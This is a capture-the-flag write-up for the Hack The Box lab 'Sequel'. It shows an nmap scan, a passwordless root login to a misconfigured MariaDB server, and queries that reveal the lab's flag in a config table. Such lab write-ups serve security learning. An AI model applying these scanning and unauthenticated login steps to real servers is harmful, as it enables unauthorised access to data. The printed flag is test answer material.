# Sequel

- TL;DR: We are able to log-in to a MariaDB server running on the remote host as a root user since the service was misconfigured and does not require a username and password to log-in.

## Reconnaissance 

- Run an nmap scan:
```
nmap -sC -sV 10.129.95.232     

Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 05:03 PDT
Nmap scan report for 10.129.95.232
Host is up (0.085s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, ConnectWithDatabase, SupportsTransactions, LongColumnFlag, SupportsLoadDataLocal, Speaks41ProtocolOld, IgnoreSigpipes, DontAllowDatabaseTableColumn, ODBCClient, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsCompression, Support41Auth, FoundRows, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 933GJ!`Ds7U'a5$RR#Vj
|_  Auth Plugin Name: mysql_native_password

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 209.98 seconds
```

- `-sC`: Performs a script scan using the default set of scripts. It is equivalent to `--script=default`. Some of the scripts in the catrgory are considered intrusive and should not be run against a target network without permission.
- `-sV`: Enables version detection, which will detect what versions are running on what port.

<br>

## Foothold

- We find the following port(s) open:

    - `3306/tcp` mysql 5.5.5-10.3.27-MariaDB-0+deb10u1
- I order to communicate with the database, we need to install either `mysql` or `mariadb` on our local machine. We run the following command with `*` to install all the related MySQL packages available:
    - `sudo apt update && sudo apt install mysql*`
- Once all the packages are installed, we can run the following commands:
    - `mysql -h 10.129.95.232 -u root`: The `h` flag specifies which host to connect to and the `-u` specifies the user for log-in if not current user.
    - ```
        MariaDB [(none)]> show databases;
        +--------------------+
        | Database           |
        +--------------------+
        | htb                |
        | information_schema |
        | mysql              |
        | performance_schema |
        +--------------------+
        4 rows in set (0.082 sec)
      ```
    - ```
        MariaDB [(none)]> use htb;
        Reading table information for completion of table and column names
        You can turn off this feature to get a quicker startup with -A

        Database changed
        MariaDB [htb]> 
      ```
    - ```
        MariaDB [htb]> show tables;
        +---------------+
        | Tables_in_htb |
        +---------------+
        | config        |
        | users         |
        +---------------+
        2 rows in set (0.076 sec)
      ```
    - ```
        MariaDB [htb]> select * from config;
        +----+-----------------------+----------------------------------+
        | id | name                  | value                            |
        +----+-----------------------+----------------------------------+
        |  1 | timeout               | 60s                              |
        |  2 | security              | default                          |
        |  3 | auto_logon            | false                            |
        |  4 | max_size              | 2M                               |
        |  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
        |  6 | enable_uploads        | false                            |
        |  7 | authentication_method | radius                           |
        +----+-----------------------+----------------------------------+
        7 rows in set (0.076 sec)
      ```
